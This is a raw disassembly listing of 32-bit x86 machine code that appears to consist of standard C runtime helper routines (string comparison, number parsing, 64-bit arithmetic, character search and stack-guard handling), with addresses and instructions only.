  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
